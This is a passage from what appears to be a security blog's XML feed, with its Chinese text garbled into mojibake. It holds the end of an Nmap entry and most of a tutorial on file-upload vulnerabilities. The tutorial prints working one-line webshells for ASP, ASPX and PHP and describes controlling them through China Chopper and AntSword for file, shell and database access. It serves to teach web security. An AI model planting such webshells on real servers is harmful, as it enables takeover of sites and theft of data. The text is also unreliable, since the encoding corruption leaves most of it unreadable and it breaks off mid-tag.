Mapperï¼‰æ˜¯ä¸€æ¬¾å¼€æºçš„ç½‘ç»œæ¢æµ‹å’Œå®‰å…¨å®¡è®¡å·¥å…·ï¼Œå¹¿æ³›ç”¨äºç½‘ç»œå®‰å…¨é¢†åŸŸã€‚å®ƒèƒ½å¤Ÿå¿«é€Ÿæ‰«æç½‘ç»œï¼Œæ£€æµ‹ä¸»æœºæ˜¯å¦åœ¨çº¿ã€å¼€æ”¾çš„ç«¯å£ä»¥åŠè¿è¡Œçš„æœåŠ¡å’Œå®ƒä»¬çš„ç‰ˆæœ¬ã€‚Nmap æä¾›äº†å¤šç§æ‰«ææŠ€æœ¯ï¼Œå¦‚SYNæ‰«æã€UDPæ‰«æã€æ“ä½œç³»ç»Ÿæ£€æµ‹ã€æœåŠ¡ç‰ˆæœ¬æ£€æµ‹ç­‰ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜æ”¯æŒè„šæœ¬æ‰«æï¼Œèƒ½å¤Ÿä½¿ç”¨NSEï¼ˆNmap Scripting Engineï¼‰è„šæœ¬è¿›è¡Œæ›´æ·±å…¥çš„åˆ†æï¼Œå¦‚æ£€æµ‹æ¼æ´ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚Nmap çš„çµæ´»æ€§å’Œå¼ºå¤§åŠŸèƒ½ä½¿å…¶æˆä¸ºç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«å’Œæ¸—é€æµ‹è¯•äººå‘˜çš„é‡è¦å·¥å…·ã€‚ä½¿ç”¨æ—¶éœ€ç¡®ä¿æœ‰é€‚å½“çš„æˆæƒï¼Œä»¥é¿å…è¿åæ³•å¾‹æ³•è§„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> æ¼æ´æ‰«æ </tag>
            
            <tag> nmap </tag>
            
            <tag> ä¿¡æ¯æœé›† </tag>
            
            <tag> ç«¯å£æ‰«æ </tag>
            
            <tag> æŒ‡çº¹æ¢æµ‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸºç¡€</title>
      <link href="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/"/>
      <url>/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ¼æ´æè¿°"><a href="#ä¸€ã€æ¼æ´æè¿°" class="headerlink" title="ä¸€ã€æ¼æ´æè¿°"></a>ä¸€ã€æ¼æ´æè¿°</h1><p>å¦‚æœç½‘ç«™æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹ç”¨æˆ·ä¸Šä¼ çš„å†…å®¹è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ç”šè‡³æ¶æ„æ–‡ä»¶ï¼Œ åŒ…æ‹¬æ¶æ„è„šæœ¬æ–‡ä»¶ã€exeç¨‹åºç­‰ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™å°±å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><h1 id="äºŒã€æ¼æ´æˆå› "><a href="#äºŒã€æ¼æ´æˆå› " class="headerlink" title="äºŒã€æ¼æ´æˆå› "></a>äºŒã€æ¼æ´æˆå› </h1><ul><li>1ã€æœåŠ¡å™¨é…ç½®ä¸å½“ã€‚</li><li>2ã€å¼€æ”¾äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹ä¸Šä¼ çš„å†…å®¹æ²¡æœ‰åšé™åˆ¶ã€‚</li><li>3ã€é™åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´è¢«ç»•è¿‡ã€‚</li></ul><h1 id="ä¸‰ã€æ¼æ´å±å®³"><a href="#ä¸‰ã€æ¼æ´å±å®³" class="headerlink" title="ä¸‰ã€æ¼æ´å±å®³"></a>ä¸‰ã€æ¼æ´å±å®³</h1><ul><li><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼šæ¶æ„è„šæœ¬ã€ç¨‹åºç­‰ã€‚</p></li><li><p>ä¸Šä¼ çš„å¯å†™ç›®å½•ä¹Ÿå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œä¸Šä¼ webshellå¯¼è‡´ç½‘ç«™æ²¦é™·ã€‚</p></li><li><p>é€šè¿‡å…¶ä»–æ¼æ´ææƒï¼Œå¯¼è‡´æœåŠ¡å™¨æ²¦é™·ï¼Œæ³¢åŠæ—ç«™ã€‚</p></li></ul><h1 id="å››ã€webshell"><a href="#å››ã€webshell" class="headerlink" title="å››ã€webshell"></a>å››ã€webshell</h1><h2 id="4-1-æ¦‚å¿µ"><a href="#4-1-æ¦‚å¿µ" class="headerlink" title="4.1 æ¦‚å¿µ"></a>4.1 æ¦‚å¿µ</h2><p>é€šè¿‡ä¸Šä¼ æ¼æ´è·å¾—çš„ç½‘ç«™åé—¨ï¼Œwebshellä¹Ÿæ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼Œç»§æ‰¿webç”¨æˆ·æƒé™ã€‚æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¯ä»¥åœ¨æœåŠ¡ç«¯è¿è¡Œçš„è„šæœ¬æ–‡ä»¶ã€‚</p><h2 id="4-2-å¤§é©¬"><a href="#4-2-å¤§é©¬" class="headerlink" title="4.2 å¤§é©¬"></a>4.2 å¤§é©¬</h2><p>ä»£ç å¤æ‚ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼šæ–‡ä»¶ç®¡ç†ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>âš ï¸ï¼šå¯†ç ä¸€èˆ¬å†™åœ¨æ–‡ä»¶ä¸­</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.40.56.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.42.41.png" alt="PHP å¤§é©¬ç¤ºä¾‹" style="zoom:75%;"><h2 id="4-3-å°é©¬"><a href="#4-3-å°é©¬" class="headerlink" title="4.3 å°é©¬"></a>4.3 å°é©¬</h2><h3 id="4-3-1-ä¸€å¥è¯æœ¨é©¬"><a href="#4-3-1-ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="4.3.1 ä¸€å¥è¯æœ¨é©¬"></a>4.3.1 ä¸€å¥è¯æœ¨é©¬</h3><ul><li>asp</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval&nbsp;request("x")%&gt;&nbsp;&lt;%execute&nbsp;request("x")%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>aspxï¼ˆASP.NETï¼‰</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%@&nbsp;Page&nbsp;Language="Jscript"%&gt;&lt;%eval(Request.Item["x"],"unsafe");%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language="Jscript"%&gt;ï¼šè¿™è¡Œä»£ç æ˜¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œå‘Šè¯‰ASP.NETé¡µé¢ï¼Œé¡µé¢ä¸­çš„è„šæœ¬åº”è¯¥ä½¿ç”¨JScriptï¼ˆä¹Ÿå°±æ˜¯å¾®è½¯çš„JavaScriptå®ç°ï¼‰æ¥ç¼–å†™ã€‚è¿™å…è®¸ä½ åœ¨ASP.NETé¡µé¢ä¸­ä½¿ç”¨JavaScriptä»£ç ã€‚&lt;%eval(Request.Item["x"],"unsafe");%&gt;ï¼š&lt;% ... %&gt;ï¼šè¿™æ˜¯ASP.NETä¸­æ‰§è¡ŒæœåŠ¡å™¨ç«¯ä»£ç çš„è¯­æ³•ã€‚evalï¼šè¿™æ˜¯ä¸€ä¸ªJavaScriptå‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå¹¶å°è¯•æ‰§è¡Œè¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºä»£ç ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å‡½æ•°ï¼Œå› ä¸ºå®ƒå¯ä»¥æ‰§è¡Œä»»ä½•JavaScriptä»£ç ï¼ŒåŒ…æ‹¬æ¶æ„ä»£ç ã€‚Request.Item["x"]ï¼šè¿™è¡Œä»£ç ä»HTTPè¯·æ±‚ä¸­è·å–åä¸º"x"çš„é¡¹çš„å€¼ã€‚è¿™é€šå¸¸æ˜¯ä¸€ä¸ªæŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ï¼Œä¾‹å¦‚åœ¨URLä¸­ ?x=someValueã€‚"unsafe"ï¼šè¿™æ˜¯evalå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡å®šäº†ä»£ç æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå…è®¸ä»£ç åœ¨å…¨å±€ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥è®¿é—®å’Œä¿®æ”¹å…¨å±€å˜é‡ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ã€asp VS aspxã€‘</p><pre class="line-numbers language-none"><code class="language-none">ASPï¼ˆActive Server Pagesï¼‰å’ŒASP.NETï¼ˆé€šå¸¸ä»¥æ–‡ä»¶æ‰©å±•å.aspxè¡¨ç¤ºï¼‰æ˜¯å¾®è½¯å¼€å‘çš„ä¸¤ç§ä¸åŒçš„æœåŠ¡å™¨ç«¯è„šæœ¬æŠ€æœ¯ï¼Œç”¨äºåˆ›å»ºåŠ¨æ€ç½‘é¡µã€‚å®ƒä»¬ä¹‹é—´å­˜åœ¨ä¸€äº›å…³é”®çš„åŒºåˆ«ï¼šä¸€ã€æŠ€æœ¯åŸºç¡€ï¼šASPï¼šåŸºäºVBScriptæˆ–JavaScriptï¼Œæ˜¯ä¸€ç§è¾ƒè€çš„æŠ€æœ¯ï¼Œè¿è¡Œåœ¨IISï¼ˆInternet Information Servicesï¼‰æœåŠ¡å™¨ä¸Šã€‚ASP.NETï¼šæ˜¯.NET Frameworkçš„ä¸€éƒ¨åˆ†ï¼Œæ”¯æŒå¤šç§è¯­è¨€ï¼ˆå¦‚C#ã€VB.NETç­‰ï¼‰ï¼Œæä¾›äº†æ›´å¼ºå¤§çš„åŠŸèƒ½å’Œæ€§èƒ½ã€‚äºŒã€æ‰§è¡Œæ¨¡å¼ï¼šASPï¼šè§£é‡Šæ‰§è¡Œï¼Œæ¯æ¬¡è¯·æ±‚é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨éƒ½ä¼šè§£é‡Šæ‰§è¡ŒASPä»£ç ã€‚ASP.NETï¼šç¼–è¯‘æ‰§è¡Œï¼Œ.aspxé¡µé¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶è¢«ç¼–è¯‘æˆä¸­é—´è¯­è¨€ï¼ˆILï¼‰ï¼Œç„¶åç”±.NETè¿è¡Œæ—¶ç¯å¢ƒæ‰§è¡Œï¼Œè¿™æä¾›äº†æ›´å¥½çš„æ€§èƒ½ã€‚ä¸‰ã€å¼€å‘ç¯å¢ƒï¼šASPï¼šå¼€å‘ç¯å¢ƒç›¸å¯¹ç®€å•ï¼Œé€šå¸¸ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨å’ŒIISã€‚ASP.NETï¼šæä¾›äº†é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰ï¼Œå¦‚Visual Studioï¼Œæ”¯æŒä»£ç æç¤ºã€è°ƒè¯•å’Œå…¶ä»–é«˜çº§åŠŸèƒ½ã€‚å››ã€çŠ¶æ€ç®¡ç†ï¼šASPï¼šçŠ¶æ€ç®¡ç†è¾ƒä¸ºæœ‰é™ï¼Œé€šå¸¸ä¾èµ–äºCookiesæˆ–éšè—è¡¨å•å­—æ®µã€‚ASP.NETï¼šæä¾›äº†æ›´ä¸°å¯Œçš„çŠ¶æ€ç®¡ç†é€‰é¡¹ï¼Œå¦‚ViewStateã€Session Stateã€Cacheç­‰ã€‚äº”ã€å®‰å…¨æ€§ï¼šASPï¼šå®‰å…¨æ€§è¾ƒä½ï¼Œå®¹æ˜“å—åˆ°è„šæœ¬æ³¨å…¥ç­‰æ”»å‡»ã€‚ASP.NETï¼šæä¾›äº†æ›´é«˜çº§çš„å®‰å…¨ç‰¹æ€§ï¼Œå¦‚è¾“å…¥éªŒè¯ã€æˆå‘˜èµ„æ ¼å’Œè§’è‰²ç®¡ç†ã€‚å…­ã€è·¨å¹³å°æ€§ï¼šASPï¼šä¸»è¦è¿è¡Œåœ¨WindowsæœåŠ¡å™¨ä¸Šã€‚ASP.NETï¼šè™½ç„¶ä¸»è¦ä¹Ÿæ˜¯åœ¨Windowsä¸Šè¿è¡Œï¼Œä½†éšç€.NET Coreçš„å‘å±•ï¼ŒASP.NET Coreå·²ç»æ”¯æŒè·¨å¹³å°è¿è¡Œã€‚æ€»çš„æ¥è¯´ï¼ŒASP.NETæ˜¯ASPçš„åç»§è€…ï¼Œæä¾›äº†æ›´ç°ä»£ã€æ›´å¼ºå¤§çš„Webå¼€å‘åŠŸèƒ½ã€‚éšç€æŠ€æœ¯çš„å‘å±•ï¼ŒASP.NETå·²ç»æ¼”è¿›åˆ°ASP.NET Coreï¼Œè¿™æ˜¯ä¸€ä¸ªæ›´è½»é‡çº§ã€é«˜æ€§èƒ½ã€è·¨å¹³å°çš„æ¡†æ¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php @eval($_REQUEST['cmdâ€™]);?&gt;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>jsp</li><li>jspx</li></ul><p>jSPå’Œjspxçš„ä¸€å¥è¯æœ¨é©¬æ¯”è¾ƒå¤æ‚ä¸€äº›ã€‚</p><p>ã€jsp vs jspxã€‘</p><pre class="line-numbers language-none"><code class="language-none">JSPï¼ˆJavaServer Pagesï¼‰å’Œ JSPX æ˜¯ Java Web å¼€å‘ä¸­ç”¨äºåˆ›å»ºåŠ¨æ€ç½‘é¡µçš„æŠ€æœ¯ã€‚å®ƒä»¬å…è®¸å¼€å‘è€…åœ¨ HTML é¡µé¢ä¸­åµŒå…¥ Java ä»£ç ã€‚ä»¥ä¸‹æ˜¯ JSP å’Œ JSPX çš„ä¸»è¦åŒºåˆ«ï¼š1ã€æ–‡ä»¶æ‰©å±•åï¼šJSPï¼šæ–‡ä»¶é€šå¸¸ä»¥ .jsp ä½œä¸ºæ‰©å±•åã€‚JSPXï¼šæ–‡ä»¶ä»¥ .jspx ä½œä¸ºæ‰©å±•åã€‚2ã€XMLåŸºç¡€ï¼šJSPï¼šä¸æ˜¯åŸºäº XML çš„ï¼Œè¿™æ„å‘³ç€åœ¨ JSP æ–‡ä»¶ä¸­ï¼ŒHTML æ ‡ç­¾ä¸éœ€è¦å…³é—­ï¼Œå¯ä»¥è‡ªç”±åœ°æ··åˆ HTML å’Œ Java ä»£ç ã€‚JSPXï¼šåŸºäº XML çš„ï¼Œè¦æ±‚é¡µé¢å¿…é¡»ç¬¦åˆ XML çš„æ ¼å¼ï¼Œæ‰€æœ‰çš„ HTML æ ‡ç­¾éƒ½éœ€è¦æ­£ç¡®å…³é—­ï¼Œä»¥ç¡®ä¿æ–‡ä»¶åœ¨ XML æ ¼å¼ä¸Šæ˜¯æœ‰æ•ˆçš„ã€‚3ã€è„šæœ¬å…ƒç´ ï¼šJSPï¼šä½¿ç”¨ &lt;% %&gt; æ¥åµŒå…¥ Java ä»£ç ï¼Œä½¿ç”¨ &lt;%! %&gt; æ¥å£°æ˜ç±»çº§åˆ«çš„å˜é‡å’Œæ–¹æ³•ï¼Œä½¿ç”¨ &lt;%= %&gt; æ¥è¾“å‡ºè¡¨è¾¾å¼çš„ç»“æœã€‚JSPXï¼šä½¿ç”¨ &lt;jsp:scriptlet&gt; æ¥åµŒå…¥ Java ä»£ç ï¼Œä½¿ç”¨ &lt;jsp:declaration&gt; æ¥å£°æ˜æ–¹æ³•ï¼Œè¾“å‡ºè¡¨è¾¾å¼çš„ç»“æœé€šå¸¸ä½¿ç”¨ JSPX çš„æ ‡å‡†åŠ¨ä½œ &lt;jsp:expression&gt;ã€‚4ã€æ ‡å‡†åŠ¨ä½œå’Œæ ‡ç­¾åº“ï¼šJSPï¼šå¯ä»¥ä½¿ç”¨ JSP æ ‡å‡†æ ‡ç­¾åº“ï¼ˆJSTLï¼‰æ¥å¢åŠ åŠŸèƒ½ï¼Œä½†éœ€è¦æ‰‹åŠ¨æ·»åŠ æ ‡ç­¾åº“çš„æŒ‡ä»¤ã€‚JSPXï¼šå¤©ç„¶æ”¯æŒ JSP æ ‡å‡†æ ‡ç­¾åº“ï¼Œä¸éœ€è¦é¢å¤–çš„æŒ‡ä»¤å°±å¯ä»¥ä½¿ç”¨ JSTLã€‚5ã€é…ç½®å’Œéƒ¨ç½²ï¼šJSPï¼šåœ¨ web.xml ä¸­é…ç½® servlet æ˜ å°„ã€‚JSPXï¼šé€šå¸¸ä¸éœ€è¦åœ¨ web.xml ä¸­è¿›è¡Œé¢å¤–çš„é…ç½®ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ä½œä¸º JSP çš„æ‰©å±•ã€‚6ã€å¼€å‘å·¥å…·æ”¯æŒï¼šJSPï¼šå¤§å¤šæ•° Java IDE å’Œæ–‡æœ¬ç¼–è¾‘å™¨éƒ½æ”¯æŒ JSP å¼€å‘ã€‚JSPXï¼šå¯èƒ½éœ€è¦æ›´é«˜çº§çš„ IDE æ”¯æŒï¼Œå› ä¸ºå®ƒæ˜¯åŸºäº XML çš„ã€‚7ã€æ€§èƒ½ï¼šJSPï¼šåœ¨æ€§èƒ½ä¸Šå¯èƒ½ç•¥æœ‰ä¼˜åŠ¿ï¼Œå› ä¸ºå®ƒä»¬ä¸éœ€è¦éµå¾ª XML çš„ä¸¥æ ¼æ ¼å¼ã€‚JSPXï¼šç”±äº XML çš„è§£æå¯èƒ½ç¨å¾®æ…¢ä¸€äº›ï¼Œä½†è¿™ç§å·®å¼‚é€šå¸¸å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚8ã€å¯è¯»æ€§å’Œç»´æŠ¤æ€§ï¼šJSPXï¼šç”±äºå…¶ XML åŸºç¡€ï¼Œå¯ä»¥æä¾›æ›´å¥½çš„å¯è¯»æ€§å’Œç»´æŠ¤æ€§ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå¤§å‹é¡¹ç›®ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œé€‰æ‹© JSP è¿˜æ˜¯ JSPX é€šå¸¸å–å†³äºé¡¹ç›®éœ€æ±‚ã€å›¢é˜Ÿåå¥½ä»¥åŠå¼€å‘å·¥å…·çš„æ”¯æŒã€‚JSPX æä¾›äº†æ›´ä¸¥æ ¼çš„ç»“æ„ï¼Œæœ‰åŠ©äºä¿æŒä»£ç çš„æ•´æ´å’Œä¸€è‡´æ€§ï¼Œè€Œ JSP åˆ™æä¾›äº†æ›´å¤šçš„çµæ´»æ€§ã€‚éšç€ JavaServer Faces (JSF) æ¡†æ¶çš„æµè¡Œï¼ŒJSPX ä¹Ÿå˜å¾—æ›´åŠ æµè¡Œï¼Œå› ä¸º JSF é¡µé¢é»˜è®¤ä½¿ç”¨ .jspx æ‰©å±•åã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">åœ¨Java Webå¼€å‘ä¸­ï¼Œå¦‚æœåç«¯æ–‡ä»¶ä»¥JSPæˆ–JSPXç»“å°¾ï¼Œè¿™é€šå¸¸æ„å‘³ç€è¯¥Webç³»ç»Ÿå¯èƒ½æ˜¯åŸºäºä»¥ä¸‹æ¡†æ¶å¼€å‘çš„ï¼š1ã€JavaServer Pages (JSP)ï¼šJSPæ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯æŠ€æœ¯ï¼Œå…è®¸å¼€å‘è€…åœ¨HTMLé¡µé¢ä¸­åµŒå…¥Javaä»£ç ã€‚JSPæ–‡ä»¶é€šå¸¸ç”¨äºç”ŸæˆåŠ¨æ€Webå†…å®¹ã€‚å¦‚æœä¸€ä¸ªWebç³»ç»Ÿçš„åç«¯æ–‡ä»¶ä»¥.jspç»“å°¾ï¼Œè¿™å¯èƒ½è¡¨æ˜å®ƒæ˜¯ä¸€ä¸ªä¼ ç»Ÿçš„JSPåº”ç”¨ã€‚2ã€JavaServer Faces (JSF)ï¼šJSFæ˜¯ä¸€ä¸ªåŸºäºç»„ä»¶çš„Webåº”ç”¨æ¡†æ¶ï¼Œå®ƒä½¿ç”¨JSPXæ–‡ä»¶ä½œä¸ºå…¶è§†å›¾æŠ€æœ¯ã€‚JSPXæ–‡ä»¶æ˜¯JSPçš„XMLå…¼å®¹ç‰ˆæœ¬ï¼Œå®ƒä»¬æä¾›äº†æ›´ä¸¥æ ¼çš„æ ¼å¼ï¼Œå¹¶ä¸”ä¸JSFçš„ç»„ä»¶æ¨¡å‹ç´§å¯†é›†æˆã€‚å¦‚æœåç«¯æ–‡ä»¶ä»¥.jspxç»“å°¾ï¼Œè¿™å¯èƒ½æ„å‘³ç€è¯¥ç³»ç»Ÿä½¿ç”¨äº†JSFæ¡†æ¶ã€‚3ã€Spring MVCï¼šè™½ç„¶Spring MVCé€šå¸¸ä¸Thymeleafæˆ–Freemarkeræ¨¡æ¿å¼•æ“ä¸€èµ·ä½¿ç”¨ï¼Œä½†å®ƒä¹Ÿå¯ä»¥ä¸JSPæˆ–JSPXæ–‡ä»¶ä¸€èµ·å·¥ä½œã€‚åœ¨Spring MVCåº”ç”¨ä¸­ï¼Œæ§åˆ¶å™¨ä¼šå¤„ç†HTTPè¯·æ±‚å¹¶è¿”å›ä¸€ä¸ªè§†å›¾åç§°ï¼Œè¿™ä¸ªè§†å›¾åç§°å¯ä»¥æ˜ å°„åˆ°ä¸€ä¸ªJSPæˆ–JSPXé¡µé¢ã€‚4ã€Strutsï¼šStrutsæ˜¯ä¸€ä¸ªMVCæ¡†æ¶ï¼Œå®ƒä¹Ÿæ”¯æŒä½¿ç”¨JSPå’ŒJSPXæ–‡ä»¶ä½œä¸ºå…¶è§†å›¾å±‚ã€‚åœ¨Strutsåº”ç”¨ä¸­ï¼ŒJSPå’ŒJSPXæ–‡ä»¶ç”¨äºå±•ç¤ºæ•°æ®å’Œå¤„ç†ç”¨æˆ·è¾“å…¥ã€‚5ã€å…¶ä»–Java EEæŠ€æœ¯ï¼šé™¤äº†ä¸Šè¿°æ¡†æ¶ï¼Œè¿˜æœ‰å…¶ä»–Java EEæŠ€æœ¯å¯èƒ½ä½¿ç”¨JSPå’ŒJSPXæ–‡ä»¶ï¼Œå¦‚EJBï¼ˆEnterprise JavaBeansï¼‰ã€‚   éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJSPå’ŒJSPXæ–‡ä»¶å¯ä»¥ä¸å¤šç§Java Webæ¡†æ¶ä¸€èµ·ä½¿ç”¨ï¼Œå®ƒä»¬æœ¬èº«å¹¶ä¸å±€é™äºç‰¹å®šçš„æ¡†æ¶ã€‚å¼€å‘è€…å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚å’Œåå¥½é€‰æ‹©åˆé€‚çš„æ¡†æ¶å’ŒæŠ€æœ¯æ ˆã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-2-é…åˆèœåˆ€ã€èšå‰‘ä½¿ç”¨"><a href="#4-3-2-é…åˆèœåˆ€ã€èšå‰‘ä½¿ç”¨" class="headerlink" title="4.3.2 é…åˆèœåˆ€ã€èšå‰‘ä½¿ç”¨"></a>4.3.2 é…åˆèœåˆ€ã€èšå‰‘ä½¿ç”¨</h3><p>ä¸€å¥è¯æœ¨é©¬çŸ­å°ç²¾æ‚ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯éœ€è¦é…åˆä¸­å›½èœåˆ€æˆ–è€…ä¸­å›½èšå‰‘å®¢æˆ·ç«¯ä½¿ç”¨ã€‚å®ƒä»¬èƒ½å¤Ÿå®ç°çš„åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ul><li>æ–‡ä»¶ç®¡ç†</li><li>è™šæ‹Ÿç»ˆç«¯</li><li>æ•°æ®åº“ç®¡ç†ï¼šæ­¤æ—¶éœ€è¦çŸ¥é“è¿æ¥æ•°æ®åº“çš„è´¦å¯†</li></ul><h4 id="1ï¼‰ä¸­å›½èœåˆ€"><a href="#1ï¼‰ä¸­å›½èœåˆ€" class="headerlink" title="1ï¼‰ä¸­å›½èœåˆ€"></a>1ï¼‰ä¸­å›½èœåˆ€</h4><p>ä¸­å›½èœåˆ€æ˜¯ä¸€å¥è¯æœ¨é©¬çš„ç®¡ç†å™¨ï¼Œä¹Ÿæ˜¯å‘½ä»¤æ“ä½œæ¥å£ã€‚ä¸­å›½èœåˆ€åœ¨è¿æ¥ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™éœ€è¦å¡«å†™å¯†ç (å®é™…ä¸Šå°±æ˜¯å˜é‡å)ã€‚</p><p>ä¸­å›½èœåˆ€ä¸ä¸€å¥è¯æœ¨é©¬é…åˆå®ç°äº†ä¸‰å¤§åŸºæœ¬åŠŸèƒ½ï¼Œå¦‚ä¸‹ã€‚</p><p>@æ–‡ä»¶ç®¡ç†</p><p>åœ¨ä¸­å›½èœåˆ€é¡µé¢ç»§æ‰¿Webç”¨æˆ·æƒé™å¯ä»¥å®ç°æ–‡ä»¶ç®¡ç†ï¼ŒåŒ…æ‹¬æ–‡ä»¶æŸ¥çœ‹ã€ä¸Šä¼ ã€ä¸‹è½½ã€ä¿®æ”¹ã€åˆ é™¤ç”šè‡³è¿è¡Œexeç¨‹åºç­‰ã€‚</p><p>@è™šæ‹Ÿç»ˆç«¯</p><p>åœ¨ä¸­å›½èœåˆ€ä¸‹å¯ä»¥è·å¾—ç±»ä¼¼äºcmdå’Œbashçš„å‘½ä»¤è¡Œæ¥å£ï¼Œå¯ä»¥æ‰§è¡Œç›¸å…³å‘½ä»¤ã€‚</p><p>@æ•°æ®åº“ç®¡ç†</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸­å›½èœåˆ€è¿›è¡Œæ•°æ®åº“ç®¡ç†ï¼Œæ­¤æ—¶éœ€è¦çŸ¥é“è¿æ¥æ•°æ®åº“çš„è´¦å¯†ã€‚</p><h4 id="2ï¼‰èšå‰‘"><a href="#2ï¼‰èšå‰‘" class="headerlink" title="2ï¼‰èšå‰‘"></a>2ï¼‰èšå‰‘</h4><p>phpä¸€å¥è¯æœ¨é©¬ï¼š</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.54.49.png" style="zoom:75%;"><p>è¿æ¥èšå‰‘ï¼š</p><ul><li>æ–‡ä»¶ç®¡ç†</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.57.44.png" style="zoom:75%;"><ul><li>è™šæ‹Ÿç»ˆç«¯</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.58.30.png" style="zoom:75%;"><ul><li>æ•°æ®åº“ç®¡ç†</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.04.30.png" style="zoom:55%;"><p>é…ç½®ï¼šå¯†ç root</p><img 